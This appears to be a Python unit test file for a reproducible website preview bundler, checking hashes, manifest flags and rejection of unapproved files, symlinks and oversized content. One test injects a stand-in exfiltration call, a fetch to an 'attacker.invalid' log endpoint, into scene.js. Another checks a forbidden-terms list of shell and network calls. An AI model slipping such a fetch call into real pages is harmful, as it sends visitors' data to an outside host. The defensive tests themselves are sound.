"""Reproducible E5 preview bundle safety tests; no deployment or model calls."""
from pathlib import Path
from tempfile import TemporaryDirectory
from unittest import TestCase, main
import hashlib
import io
import json
import shutil
import zipfile

import e5_reference_preview as e5


class PreviewAcceptance(TestCase):
    def test_bitwise_reproducible_bundle_and_content_integrity(self):
        raw, manifest=e5.pack_preview(e5.REFERENCE)
        again, other=e5.pack_preview(e5.REFERENCE)
        self.assertEqual(raw,again)
        self.assertEqual(manifest,other)
        self.assertFalse(manifest["modelAuthored"])
        self.assertFalse(manifest["productionReady"])
        self.assertEqual(manifest["runtimeReleaseStatus"],"NO_GO")
        with zipfile.ZipFile(io.BytesIO(raw)) as archive:
            self.assertEqual(archive.testzip(),None)
            self.assertEqual(set(archive.namelist()),
                set(e5.FILES)|{"preview-manifest.json"})
            self.assertEqual(json.loads(archive.read("preview-manifest.json")),manifest)
            self.assertTrue(all(not x.startswith("/") and ".." not in x
                                for x in archive.namelist()))
            for item in manifest["files"]:
                self.assertEqual(hashlib.sha256(archive.read(item["path"])).hexdigest(),
                                 item["sha256"])

    def fixture(self, path: Path):
        path.mkdir()
        for name in e5.FILES:
            shutil.copyfile(e5.REFERENCE/name,path/name)

    def test_extra_files_scripts_and_external_resources_denied(self):
        with TemporaryDirectory() as tmp:
            source=Path(tmp)/"site"
            self.fixture(source)
            (source/"secrets.txt").write_text("wrong",encoding="utf-8")
            with self.assertRaisesRegex(ValueError,"UNAPPROVED_ASSET_SET"):
                e5.pack_preview(source)
            (source/"secrets.txt").unlink()
            (source/"index.html").write_text(
                (source/"index.html").read_text().replace(
                    "./styles.css","https://attacker.invalid/style.css"))
            with self.assertRaisesRegex(ValueError,"UNAPPROVED_DOCUMENT_REFERENCES"):
                e5.pack_preview(source)
            shutil.copyfile(e5.REFERENCE/"index.html",source/"index.html")
            with (source/"scene.js").open("a") as f:
                f.write("\nfetch('https://attacker.invalid/log')\n")
            with self.assertRaisesRegex(ValueError,"UNAPPROVED_REMOTE_RESOURCE"):
                e5.pack_preview(source)

    def test_symlinks_binary_and_size_boundaries_denied(self):
        with TemporaryDirectory() as tmp:
            source=Path(tmp)/"site"
            self.fixture(source)
            (source/"scene.js").unlink()
            (source/"scene.js").symlink_to(e5.REFERENCE/"scene.js")
            with self.assertRaisesRegex(ValueError,"SYMLINK"):
                e5.pack_preview(source)
            (source/"scene.js").unlink()
            (source/"scene.js").write_bytes(b"\xff\x00")
            with self.assertRaisesRegex(ValueError,"UTF8"):
                e5.pack_preview(source)
            (source/"scene.js").write_text("x"*e5.MAX_FILE_BYTES+"x")
            with self.assertRaisesRegex(ValueError,"OVERSIZED"):
                e5.pack_preview(source)

    def test_rendered_bundle_does_not_execute_model_or_deploy(self):
        source=(Path(__file__).resolve().parent/"e5_reference_preview.py").read_text()
        for term in ("modelAuthored\": False","deploymentAuthorized\": False",
                     "externalNetworkRequestsRequired\": False","NO_GO",
                     "zipfile.ZipFile","hashlib.sha256","validate_source"):
            self.assertIn(term,source)
        for forbidden in ("requests.post(","subprocess.run(","https://vercel",
                          "child_process","os.system("):
            self.assertNotIn(forbidden,source)


if __name__=="__main__":
    main()
